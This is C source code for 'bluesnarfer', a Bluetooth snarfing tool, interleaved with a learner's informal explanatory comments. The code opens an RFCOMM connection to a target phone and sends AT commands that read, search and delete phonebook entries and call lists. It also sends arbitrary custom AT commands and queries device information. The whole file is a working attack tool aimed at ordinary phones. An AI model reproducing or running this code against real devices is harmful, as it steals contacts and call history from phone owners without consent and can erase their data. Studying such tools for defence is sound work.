/*
        bluesnarfer ..
        bluetooth snarfing tool , there is also one mutch better than that,
   minicom :P

        Authors: Roberto Martelloni "boos", Davide Del Vecchio "Dante
   Alighieri".. Email : r.martelloni2003@libero.it, dante@alighieri.org ..

        
        TODO:
        - REWRITE ALL the code in a better way ..
        - add sms (mms?)
        - add call to number
        - add inquiry procedure
        - create a ncurses interface ?
        - create db of vulnerable device
        - sdp port scan

*/

#include <errno.h>
#include <getopt.h> // this is used for  systems that do not have unistd since its not a c lib
#include <signal.h>
#include <stdio.h>
#include <stdlib.h>
#include <sys/ioctl.h>
#include <sys/socket.h>
#include <termios.h>
#include <unistd.h> // this is the same a getopt but for mainly linux based machines !

#include <bluetooth/bluetooth.h>
#include <bluetooth/hci.h>
#include <bluetooth/hci_lib.h>
#include <bluetooth/rfcomm.h>

#include "bluesnarfer.h"

void parse_rw(struct opt *options, char *toparse) {
// takes a pointer to a struct called options, and then a pointer to a string
        char *ptr; // char pointer is made
			/* if - is found in the string that is being
			// parsed n strchr will will return a pointer to the character found in "toparse
			// this will then be assigned to the ptr 
			// ELSE if not found ptr will be NULL 
			*/
        if (ptr = strchr(toparse, '-')) {

                *ptr = 0; // this will replace the - character with a null term like 0 
						  // this will split the strings into 2 parts 
                options->N_MIN = atoi(optarg);// see the variable in line: 92 
				// this  will convert the string to an int and is being set with pointer notation
				// Nmin can be found in the header file of the program, asa  reuslt this makes nmin of 
				// the struct and changes it to the integerversion or the option argument !
                options->N_MAX = atoi(ptr + 1);
				// if the - is found the pointer will be pointing to the character after this char 
				// this will then be the max of the n_max attribute of the options prorgam
				// if im not wrong this is ment for the range of contacts it wishes to read from 
				// i would say something liek 20-100 
				// this fucntion would then read 20 until it gets to the "-" char 
				// if this happens then the program will strip the char and the pointer will point to 
				// the value of 100 and store that as the max and store 20 as the min 
        } else
                options->N_MIN = options->N_MAX = atoi(optarg);// else if its not found then we will take 
				// the numbers enteredm, this would be something like the range
				// if thats the case then, both N_MIN and N_MAX will be the same value in the options structure
				// in the case that the - isnt present in the commandline it will then make the number both 
				// the min and the max of the program
}
int info_cmd(FILE *fd);// inits the function called info command !

int main(int ac, char **av) {//start of the main program

        struct opt options; //inits the struct called opt (found int he header file btw)AND calls it options
        int opt, dd; // ints the options and dd .. idk what that is yet 

        options.phonebook = options.bd_addr = 0x00;
		// this makes the phonebook option to be equal to the address of options 
		// in this case phonebook is the memory storage of the phonebook 
		// and then we are setting it equal to the blueooth address to snarf! 
        options.act = 0; // here we are setting the action to zero
        options.channel = 17; // and here we are setting the channel to 17! 

        if (getuid()){// this will get the user id
		/*any non zero value is considered true, if the user uid is
		 * and then zero is considered to be false
		 * in this case if the user is not root and getuid will return a non zero 
		 * this is then considered to be true for the prorgam and will execute the statement
		 * GETUID will return zero if the program is being ran as root tho
		 * if this is the case then the code in the if statement will not be exed*/

                fprintf(stderr, "bluesnarfer: you must be root\n");
                usage(*av);// this calls the useage function that will be covered soon
						   // FLAG!!!!!!!!
        }// this is more likely for error control 
		// Since the if statement did not exe that means we can go into the main program 
        while ((opt = getopt(ac, av, "C:b:c:r:w:f:s:ldih")) != EOF) {
			// C:b:c:r:w:f:s: these commands take argments after ! for example 
			// -b would take the bluetooth address and thne copy it to the options.bd_addr 

                switch (opt) {

                case 'b':
					// optarg is defined in unistd.h and it holds the value stored when the user types in 
					// the command line when executin the prog
                        options.bd_addr = optarg;
                        break;
						// here if the user does "-b 58:34:E5:34:DF"
						// the MAC will be stored in optarg 
						// then it is assigned to the struct var called options that was inited earlier!
						// this stored the MAC as a string!

                case 'c':
                        options.act = CUSTOM; // custom is 0x1 and is being set as the atribute to options 
                        options.custom_cmd = optarg;// sets the command
                        break;

                case 'C':
                        options.channel = atoi(optarg); // specifies the channel and changes the text to a number !
                        break;// sets the channelt to one

                case 'r':
                        options.act = READ; //sets the act to read now also defined in header
						// the value is 0x2
                        parse_rw(&options, optarg);
						// here you pass the address of the struct created and then the argument! 
						// in this case it would read the value after -r whihc would be the N-M 
						// this would eb he upper and lower rannges for the program to read
                        break;

                case 'w':
                        options.act = WRITE;
                        parse_rw(&options, optarg);
                        break; // same as read but this never seemed to work for me who know why tho

                case 'f':
                        options.act = SEARCH;
                        options.name = optarg;
                        break;// if f is passed then, the act is changed to search whihch is: 0x4! 

                case 's':
                        options.phonebook = optarg;
                        break;
						// this sets the phonebook to the value of the phonebook memory

                case 'l':
                        options.act = LIST;
                        break; // chages it to the list

                case 'i':
                        options.act = INFO;
                        break; // changes it to information

                default:
                        usage(*av);
                        break;
						// prompts the user to kno whow to use this prorgam with the useage progam
                }
        }

        if (optind > 5 && !(options.phonebook || options.channel)) {

                fprintf(stderr, "bluesnarfer: use only one action\n");
                exit(0);
        }

        if (!options.bd_addr) {

                fprintf(stderr, "bluesnarfer: you must set bd_addr\n");
                usage(*av);
        }

        if (!options.act) {

                fprintf(stderr, "bluesnarfer: select an action\n");
                usage(*av);
        }// this is mainly error control

        bluesnarfer(options); //THIS is where we send the struct of the device to the bluesnarfer function!

        exit(0);
}

int bluesnarfer(struct opt options) {// takes int a structure, in practice this wopuld be what the main program defined 

        FILE *fd;// file makes a pointer to the variable of a file stream, which can then be used to mod/read data

        signal(SIGINT, (void *)bt_rfcomm_rel);// calls the singal function to set up handler for si
		// the second arg is a poitner to a function called btooth rfcomm relay
        signal(SIGSEGV, (void *)bt_rfcomm_rel);

        if ((device = hci_for_each_dev(HCI_UP, 0x00, 0)) < 0)
                fprintf(stderr, "bluesnarfer: hci_for_each_dev , %s\n",
                        strerror(errno));
		// this is found in the header for bluetooth, HCI_UP means devces that are already up and running
		// 0x00 is a HCI device filter (this is called a BITMASK ) this will specify the type of device a 
		// function should consider! 
		// the 0x00 means no filtering is applied so all devices matching the state filter will be considered
		// Third arg is a call back that will be called for each HCI dev that matcehs the filter 
		// if function returns less than 0 
		// this mainly happens when there is an error going through bluetooth devices ! like it wasnt set up right

        //fprintf(stderr, "bluesnarfer: bt_get_remote_name(options.bd_addr)\n");
        if (bt_get_remote_name(options.bd_addr) < 0)
			// if we cant get the device name from the struct
                fprintf(stderr, "bluesnarfer: unable to get device name\n");

        //fprintf(stderr, "bluesnarfer: creating RFCOMM control socket\n");
        if ((ctl = socket(AF_BLUETOOTH, SOCK_RAW, BTPROTO_RFCOMM)) < 0)
                fprintf(stderr,
                        "bluesnarfer: Can't open RFCOMM control socket");

        //fprintf(stderr, "bluesnarfer: calling bt_rfcomm(ctl, options.bd_addr, "
        //                "options.channel)\n");
        if (!(fd = bt_rfcomm(ctl, options.bd_addr, options.channel)))
                fprintf(stderr,
                        "bluesnarfer: unable to create rfcomm connection\n");

        //fprintf(stderr, "bluesnarfer: calling switch_cmd(fd, options)\n");
        if (switch_cmd(fd, options) < 0)
                fprintf(stderr, "bluesnarfer: send_cmd failed\n");

        bt_rfcomm_rel();

        return 0;
}

void usage(char *bin) {

        fprintf(stderr,
                "bluesnarfer, version %s -\n"
                "usage: %s [options] [ATCMD] -b bt_addr\n\n"
                "ATCMD     : valid AT+CMD (GSM EXTENSION)\n\n"
                "TYPE      : valid phonebook type ..\n"
                "example   : \"DC\" (dialed call list)\n"
                "            \"SM\" (SIM phonebook)\n"
                "            \"RC\" (recevied call list)\n"
                "            \"XX\" much more\n\n"
                "-b bdaddr : bluetooth device address\n"
                "-C chan   : bluetooth rfcomm channel\n\n"
                "-c ATCMD  : custom action\n"
                "-r N-M    : read phonebook entry N to M \n"
                "-w N-M    : delete phonebook entry N to M\n"
                "-f name   : search \"name\" in phonebook address\n"
                "-s TYPE   : select phonebook memory storage\n"
                "-l        : list aviable phonebook memory storage\n"
                "-i        : device info\n",
                VERSION, bin);
        exit(0);
}

int bt_get_remote_name(char *str_bdaddr) {

        struct hci_conn_info_req cr;
        int dd, cc, handler;
        char name[248];
        bdaddr_t bdaddr;

        if ((dd = hci_open_dev(device)) < 0) {

                fprintf(stderr, "bluesnarfer: hci_open_dev : %s\n",
                        strerror(errno));
                return -1;
        }

        str2ba(str_bdaddr, &bdaddr);

        memcpy(&cr.bdaddr, &bdaddr, sizeof(bdaddr_t));
        cr.type = ACL_LINK;

        if (ioctl(dd, HCIGETCONNINFO, (unsigned long)&cr) < 0) {

                if ((cc = hci_create_connection(dd, &bdaddr,
                                                htobs(HCI_DM1 | HCI_DH1), 0, 0,
                                                (void *)&handler, 25000)) < 0) {

                        fprintf(stderr,
                                "bluesnarfer: hci_create_connection failed\n");
                        hci_close_dev(dd);

                        return -1;
                }
        }

        if (hci_read_remote_name(dd, &bdaddr, 248, name, 25000)) {

                fprintf(stderr, "bluesnarfer: hci_read_remote_name failed\n");

                hci_close_dev(dd);
                hci_disconnect(dd, handler, HCI_OE_USER_ENDED_CONNECTION,
                               10000);

                return -1;
        }

        printf("device name: %s\n", name);

        if (cc)
                hci_disconnect(dd, handler, HCI_OE_USER_ENDED_CONNECTION,
                               10000);

        hci_close_dev(dd);
        return 0;
}

char *rfcomm_read(FILE *fp, char *send) {

        int r, ret;
        char *line;

        long unsigned int line_size;

        line = 0x00;
        ret = line_size = 0;

        while (1) {

                r = getline(&line, &line_size, fp);

                line[r - 1] = 0;

                if (!strncmp(line, send, strlen(line)) && !ret) {

                        ret = 1;
                        continue;
                }

                if (strncmp(line, send, strlen(line)) && ret)
                        return line;
        }

        return 0x00;
}

FILE *bt_rfcomm(int sock, char *str_bdaddr, int channel) {

        struct rfcomm_dev_req req;
        int device, ctl;
        bdaddr_t bdaddr;
        FILE *fd;

        //fprintf(stderr, "calling hci_get_route(0x00)\n");
        if ((device = hci_get_route(0x00)) < 0) {

                fprintf(stderr, "bluesnarfer: hci_get_route local failed\n");
                return 0x00;
        }

        str2ba(str_bdaddr, &bdaddr);

        memset(&req, 0x00, sizeof(req));

        req.dev_id = device;
        req.channel = channel;

        memcpy(&req.src, BDADDR_ANY, sizeof(BDADDR_ANY));
        memcpy(&req.dst, &bdaddr, sizeof(bdaddr));

        //fprintf(stderr, "calling ioctl(sock, RFCOMMCREATEDEV, &req)\n");
        if (ioctl(sock, RFCOMMCREATEDEV, &req) < 0) {

                fprintf(stderr,
                        "bluesnarfer: ioctl RFCOMMCREATEDEV failed, %s\n",
                        strerror(errno));
                return 0x00;
        }

        //fprintf(stderr, "calling bt_rfcomm_config()\n");
        if (!(fd = bt_rfcomm_config())) {

                fprintf(stderr, "bluesnarfer: bt_rfcomm_config failed\n");
                return 0x00;
        }

        return fd;
}

FILE *bt_rfcomm_config() {

        char dev_device[1024];
        struct termios term;
        FILE *fd;
        int fdc;

        snprintf(dev_device, 1024, "%s%d", RFCOMMDEV, device);

        //fprintf(stderr, "opening %s\n", dev_device);
        if (!(fd = fopen(dev_device, "r+"))) {
                fprintf(stderr, "bluesnarfer: open %s, %s\n", dev_device,
                        strerror(errno));
                return 0x00;
        }

        fdc = fileno(fd);

        //fprintf(stderr, "calling tcgetattr(fdc, &term)\n");
        if (tcgetattr(fdc, &term) < 0) {

                fprintf(stderr, "bluesnarfer: tcgetattr failed, %s\n",
                        strerror(errno));
                return 0x00;
        }

        term.c_cflag = CS8 | CLOCAL | CREAD;
        term.c_iflag = ICRNL;
        term.c_oflag = 0;
        term.c_lflag = ICANON;

        tcsetattr(fdc, TCSANOW, &term);

        if ((cfsetispeed(&term, B230400) < 0) ||
            (cfsetospeed(&term, B230400) < 0)) {

                fprintf(stderr, "bluesnarfer: cfset(i/o)speed failed, %s\n",
                        strerror(errno));
                return 0x00;
        }

        return fd;
}

// i can do it better ..
int switch_cmd(FILE *fd, struct opt options) {

        int ret;

        switch (options.act) {

        case CUSTOM:
                //fprintf(stderr, "ret = custom_cmd(fd, options.custom_cmd);\n");
                ret = custom_cmd(fd, options.custom_cmd);
                break;

        case READ:
                //fprintf(stderr, "ret = rw_cmd(fd, options);\n");
                ret = rw_cmd(fd, options);
                break;

        case WRITE:
                //fprintf(stderr, "ret = rw_cmd(fd, options);\n");
                ret = rw_cmd(fd, options);
                break;

        case SEARCH:
                //fprintf(stderr, "ret = search_cmd(fd, options);\n");
                ret = search_cmd(fd, options);
                break;

        case LIST:
                //fprintf(stderr, "ret = list_cmd(fd);\n");
                ret = list_cmd(fd);
                break;

        case INFO:
                //fprintf(stderr, "ret = info_cmd(fd);\n");
                ret = info_cmd(fd);
                break;
        }

        return ret;
}

// raw output ..
int custom_cmd(FILE *fd, char *cmd) {

        char buffer[128], *ptr;
        int r, bsize;

        if (!strstr(cmd, "AT")) {

                printf("bluesnarfer: invalid command inserted, you must insert "
                       "AT.*\n");
                return -1;
        }

        snprintf(buffer, 128, "%s\r\n", cmd);

        if (!fwrite(buffer, strlen(buffer), 1, fd)) {

                fprintf(stderr, "bluesnarfer: fwrite, %s", strerror(errno));
                return -1;
        }

        printf("custum cmd selected, raw output\n");

        if (!(ptr = rfcomm_read(fd, buffer))) {

                fprintf(stderr, "bluesnarfer: rfcomm_read failed\n");
                return -1;
        }

        printf("%s\n", ptr);

        return 0;
}

void bt_rfcomm_rel() {

        struct rfcomm_dev_req req;

        memset(&req, 0x00, sizeof(req));
        req.dev_id = device;

        if (ioctl(ctl, RFCOMMRELEASEDEV, &req) < 0) {

                fprintf(stderr, "bluesnarfer: unable to relase rfcomm\n");
                exit(-1);
        }

        printf("bluesnarfer: release rfcomm ok\n");

        exit(0);
}

int rw_cmd(FILE *fd, struct opt options) {

        char buffer[32];
        char *ptr, *tptr;

        if (!options.phonebook) {

                fwrite(DEFAULTPB, strlen(DEFAULTPB), 1, fd);

                rfcomm_read(fd, DEFAULTPB);
        } else {

                printf("custom phonebook selected\n");
                snprintf(buffer, 32, "AT+CPBS=\"%s\"\r\n", options.phonebook);
                fwrite(buffer, strlen(buffer), 1, fd);

                rfcomm_read(fd, buffer);
        }

        do {

                if (options.act == READ)
                        snprintf(buffer, 32, "AT+CPBR=%d\r\n", options.N_MIN);

                else
                        snprintf(buffer, 32, "AT+CPBW=%d\r\n", options.N_MIN);

                if (!fwrite(buffer, strlen(buffer), 1, fd)) {

                        fprintf(stderr, "bluesnarfer: write, %s",
                                strerror(errno));
                        return -1;
                }

                if (options.act == READ) {

                        if (!(ptr = rfcomm_read(fd, buffer))) {

                                fprintf(stderr,
                                        "bluesnarfer: rfcomm_read failed\n");
                                return -1;
                        }

                        if (tptr = parse(ptr)) {

                                printf("%s\n", tptr);
                                free(tptr);
                        }
                } else {

                        if (!rfcomm_read(fd, buffer)) {

                                fprintf(stderr,
                                        "bluesnarfer: rfcomm_read failed\n");
                                return -1;
                        }

                        printf("delete of entry %d successfull\n",
                               options.N_MIN);
                }

                options.N_MIN++;

        } while (options.N_MIN <= options.N_MAX);

        return 0;
}

char *parse(char *ptr) {

        char *pa, *tptr, *indx, *num, *name;

        pa = malloc(1024);
        memset(pa, 0x00, 1024);

        // indx number ..
        if (tptr = strchr(ptr, ':')) {

                indx = tptr + 1;
                if (!strlen(indx))
                        return 0x00;

                tptr = strchr(ptr, ',');
                *tptr = 0;
                ptr = tptr + 1;

                if (!strlen(indx))
                        return 0x00;

                tptr = strchr(ptr, '"');
                num = tptr + 1;

                if (!strlen(indx))
                        return 0x00;

                tptr = strchr(num, '"');
                *tptr = 0;

                ptr = tptr + 1;
                if (!strlen(ptr))
                        return 0x00;
                tptr = strchr(ptr, '"');

                name = tptr + 1;
                if (!strlen(name))
                        return 0x00;
                tptr = strchr(name, '"');
                *tptr = 0;

                snprintf(pa, 1024, "+ %s - %s : %s", indx, name, num);

                return pa;
        }

        return NULL;
}

int search_cmd(FILE *fd, struct opt options) {

        char buffer[256], *ptr, *p;

        printf("start to search name: %s\n", options.name);

        if (options.phonebook)
                snprintf(buffer, 256, "AT+CPBS=\"%s\"\r\n", options.phonebook);
        else
                snprintf(buffer, 256, "AT+CPBS=\"ME\"\r\n");

        if (!fwrite(buffer, strlen(buffer), 1, fd)) {

                fprintf(stderr, "bluesnarfer: fwrite failed\n");
                return -1;
        }

        rfcomm_read(fd, buffer);

        snprintf(buffer, 256, "AT+CPBF=\"%s\"\r\n", options.name);
        if (!fwrite(buffer, strlen(buffer), 1, fd)) {

                fprintf(stderr, "bluesnarfer: fwrite failed\n");
                return -1;
        }

        if (!(ptr = rfcomm_read(fd, buffer))) {

                fprintf(stderr, "bluesnarfer: rfcomm_read failed\n");
                return -1;
        }

        if (!(p = parse(ptr)))
                printf("bluesnarfer: entry not found\n");
        else
                printf("%s\n", p);

        return 0;
}

int list_cmd(FILE *fd) {

        char buffer[] = "AT+CPBS=?\r\n";
        char *c, *ptr;
        char *phonebook[] = {"DC", "EN", "FD", "LD", "MC", "MT",
                             "ON", "RC", "SM", "TA", NULL};
        char *pbd[] = {" DC  - Dialled call list\n",
                       " EN  - Emergency number list\n",
                       " FD  - SIM fix dialing list\n",
                       " LD  - SIM last dialing list\n",
                       " MC  - ME missed call list\n",
                       " MT  - ME + SIM conbined list\n",
                       " ON  - SIM o ME own number list\n",
                       " RC  - ME received calls list\n",
                       " SM  - SIM phonebook list\n",
                       " TA  - TA phonebook list\n",
                       NULL};
        int i;

        c = 0x00;

        if (!fwrite(buffer, strlen(buffer), 1, fd)) {

                fprintf(stderr, "bluesnarfer: fwrite failed\n");
                return -1;
        }

        if (!(ptr = rfcomm_read(fd, buffer))) {

                fprintf(stderr, "bluesnarfer: rfcomm_read failed\n");
                return -1;
        }

        printf("phobebook list: \n");

        ptr = strchr(ptr, '(') + 1;

        while (c = strchr(ptr, ',')) {

                *c = 0;

                for (i = 0; phonebook[i]; i++) {

                        if (strstr(ptr, phonebook[i])) {

                                printf("%s", pbd[i]);

                                break;
                        }
                }

                if (!phonebook[i])
                        printf("%s - Unknow phonebook list\n", ptr);

                ptr = c + 1;
        }
}

int info_cmd(FILE *fd) {

        char buffer[128], *p;

        snprintf(buffer, 128, "AT+CGMI\r\n");
        //fprintf(stderr, "calling fwrite()\n");
        if (!fwrite(buffer, strlen(buffer), 1, fd)) {

                fprintf(stderr, "bluesnarfer: fwrite failed\n");
                return -1;
        }
	//fprintf(stderr, "calling rfcomm_read(fd, buffer)\n");
        p = rfcomm_read(fd, buffer);
        fprintf(stderr, "%s\n", p);

        snprintf(buffer, 128, "AT+CGMM\r\n");
        //fprintf(stderr, "calling fwrite()\n");
        if (!fwrite(buffer, strlen(buffer), 1, fd)) {

                fprintf(stderr, "bluesnarfer: fwrite failed\n");
                return -1;
        }
	//fprintf(stderr, "calling rfcomm_read(fd, buffer)\n");
        p = rfcomm_read(fd, buffer);
        fprintf(stderr, "%s\n", p);

        snprintf(buffer, 128, "AT+CGMR\r\n");
        //fprintf(stderr, "calling fwrite()\n");
        if (!fwrite(buffer, strlen(buffer), 1, fd)) {

                fprintf(stderr, "bluesnarfer: fwrite failed\n");
                return -1;
        }
	//fprintf(stderr, "calling rfcomm_read(fd, buffer)\n");
        p = rfcomm_read(fd, buffer);
        fprintf(stderr, "%s\n", p);

        return 0;
}
